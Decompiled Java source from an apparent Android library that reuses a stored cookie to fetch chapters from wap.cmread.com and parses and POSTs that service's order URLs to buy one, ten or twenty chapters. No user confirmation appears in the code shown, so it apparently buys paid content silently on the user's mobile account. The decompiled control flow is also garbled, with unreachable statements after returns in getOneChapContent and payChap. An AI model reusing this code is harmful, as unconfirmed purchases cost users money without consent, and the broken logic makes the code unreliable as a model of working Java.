package com.yl.codelib.cmread;

import android.content.Context;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.utils.HttpConnent;
import com.yl.codelib.utils.TextUtil;
import org.json.JSONException;
import org.json.JSONObject;

public class CmreadUtil
{
  public static final String CM_MAIN_URL_HTTP = "http://wap.cmread.com";
  public static final String CM_MAIN_URL_HTTPS = "https://wap.cmread.com";
  
  public CmreadUtil() {}
  
  public static CmreadPayInfo getOneChapContent(String paramString, Context paramContext)
  {
    CmreadPayInfo localCmreadPayInfo = new CmreadPayInfo();
    MyPreference localMyPreference = new MyPreference(paramContext);
    String str = localMyPreference.readString("CM_Cookie", "");
    paramContext = paramString;
    if (!paramString.contains("vt=9")) {
      paramContext = paramString + "&vt=9";
    }
    localCmreadPayInfo.setReadOneChapUrl(paramContext);
    paramString = HttpConnent.doHttpPost(paramContext, str, 0);
    if (!paramString.equals("NO"))
    {
      localCmreadPayInfo.setCode(paramString);
      getPayState(localCmreadPayInfo);
      if (localCmreadPayInfo.getPayState() == 0)
      {
        parsePayUrl(localCmreadPayInfo);
        paramString = HttpConnent.doHttpPost(localCmreadPayInfo.getBuyOneUrl(), str, 0);
        if (!paramString.equals("NO"))
        {
          localCmreadPayInfo.setPayState(9);
          localCmreadPayInfo.setContent(paramString);
        }
      }
      while (localCmreadPayInfo.getPayState() != 3)
      {
        return localCmreadPayInfo;
        getPayState(localCmreadPayInfo);
        return localCmreadPayInfo;
      }
      localMyPreference.write("CM_Cookie", "");
      return localCmreadPayInfo;
    }
    localCmreadPayInfo.setPayState(-1);
    return localCmreadPayInfo;
  }
  
  public static CmreadPayInfo getOneChapContent(String paramString1, String paramString2, String paramString3, Context paramContext)
  {
    return getOneChapContent("http://wap.cmread.com/r/" + paramString1 + "/" + paramString2 + "/index.htm?page=1&vt=9&cm=" + paramString3, paramContext);
  }
  
  public static CmreadPayInfo getPayState(CmreadPayInfo paramCmreadPayInfo)
  {
    try
    {
      JSONObject localJSONObject = new JSONObject(paramCmreadPayInfo.getCode());
      if (localJSONObject.has("content"))
      {
        paramCmreadPayInfo.setContent(localJSONObject.getString("content"));
        paramCmreadPayInfo.setPayState(1);
        return paramCmreadPayInfo;
      }
      if (localJSONObject.has("loginSubmitUrl"))
      {
        paramCmreadPayInfo.setPayState(3);
        return paramCmreadPayInfo;
      }
    }
    catch (JSONException localJSONException)
    {
      paramCmreadPayInfo.setPayState(-4);
      return paramCmreadPayInfo;
    }
    paramCmreadPayInfo.setPayState(0);
    return paramCmreadPayInfo;
  }
  
  public static CmreadPayInfo getPayState(String paramString1, String paramString2, String paramString3)
  {
    CmreadPayInfo localCmreadPayInfo = new CmreadPayInfo();
    localCmreadPayInfo.setCode(HttpConnent.doHttpPost("http://wap.cmread.com/r/" + paramString1 + "/" + paramString2 + "/index.htm?page=1&vt=9&cm=" + paramString3, 0));
    return getPayState(localCmreadPayInfo);
  }
  
  public static CmreadPayInfo parsePayUrl(CmreadPayInfo paramCmreadPayInfo)
  {
    try
    {
      JSONObject localJSONObject = new JSONObject(paramCmreadPayInfo.getCode());
      String str2;
      String str1;
      if (localJSONObject.has("orderUrl"))
      {
        str2 = localJSONObject.getString("orderUrl");
        str1 = str2;
        if (TextUtil.notNull(str2))
        {
          str1 = str2;
          if (!str2.startsWith("http://wap.cmread.com"))
          {
            str1 = str2;
            if (!str2.startsWith("https://wap.cmread.com"))
            {
              str1 = str2.replace("amp;", "");
              str1 = "http://wap.cmread.com" + str1;
            }
          }
        }
        paramCmreadPayInfo.setBuyOneUrl(str1);
      }
      if (localJSONObject.has("buyTenUrl"))
      {
        str2 = localJSONObject.getString("buyTenUrl");
        str1 = str2;
        if (TextUtil.notNull(str2))
        {
          str1 = str2;
          if (!str2.startsWith("http://wap.cmread.com"))
          {
            str1 = str2;
            if (!str2.startsWith("https://wap.cmread.com"))
            {
              str1 = str2.replace("amp;", "");
              str1 = "http://wap.cmread.com" + str1;
            }
          }
        }
        paramCmreadPayInfo.setBuyTenUrl(str1);
      }
      if (localJSONObject.has("buyTwentyUrl"))
      {
        str2 = localJSONObject.getString("buyTwentyUrl");
        str1 = str2;
        if (TextUtil.notNull(str2))
        {
          str1 = str2;
          if (!str2.startsWith("http://wap.cmread.com"))
          {
            str1 = str2;
            if (!str2.startsWith("https://wap.cmread.com"))
            {
              str1 = str2.replace("amp;", "");
              str1 = "http://wap.cmread.com" + str1;
            }
          }
        }
        paramCmreadPayInfo.setBuyTwentyUrl(str1);
      }
      return paramCmreadPayInfo;
    }
    catch (JSONException localJSONException) {}
    return paramCmreadPayInfo;
  }
  
  public static CmreadPayInfo parsePayUrl(String paramString1, String paramString2, String paramString3)
  {
    CmreadPayInfo localCmreadPayInfo = new CmreadPayInfo();
    localCmreadPayInfo.setCode(HttpConnent.doHttpPost("http://wap.cmread.com/r/p/orderdata.jsp?bid=" + paramString1 + "&cid=" + paramString2 + "&vt=9&cm=" + paramString3, 0));
    return parsePayUrl(localCmreadPayInfo);
  }
  
  public static CmreadPayInfo payChap(String paramString, int paramInt)
  {
    CmreadPayInfo localCmreadPayInfo = new CmreadPayInfo();
    localCmreadPayInfo.setCode(HttpConnent.doHttpPost(paramString, 0));
    parsePayUrl(localCmreadPayInfo);
    localCmreadPayInfo.setReadOneChapUrl(paramString);
    paramString = null;
    if (paramInt == 1) {
      paramString = localCmreadPayInfo.getBuyOneUrl();
    }
    for (;;)
    {
      if (TextUtil.notNull(paramString))
      {
        if (HttpConnent.doHttpPost(localCmreadPayInfo.getBuyOneUrl(), 0).equals("NO")) {
          break;
        }
        localCmreadPayInfo.setPayState(9);
      }
      return localCmreadPayInfo;
      if (paramInt == 10) {
        paramString = localCmreadPayInfo.getBuyTenUrl();
      } else if (paramInt == 20) {
        paramString = localCmreadPayInfo.getBuyTwentyUrl();
      }
    }
    getPayState(localCmreadPayInfo);
    return localCmreadPayInfo;
  }
  
  public static CmreadPayInfo payChap(String paramString1, String paramString2, String paramString3, int paramInt)
  {
    return payChap("http://wap.cmread.com/r/" + paramString1 + "/" + paramString2 + "/index.htm?page=1&vt=9&cm=" + paramString3, paramInt);
  }
}
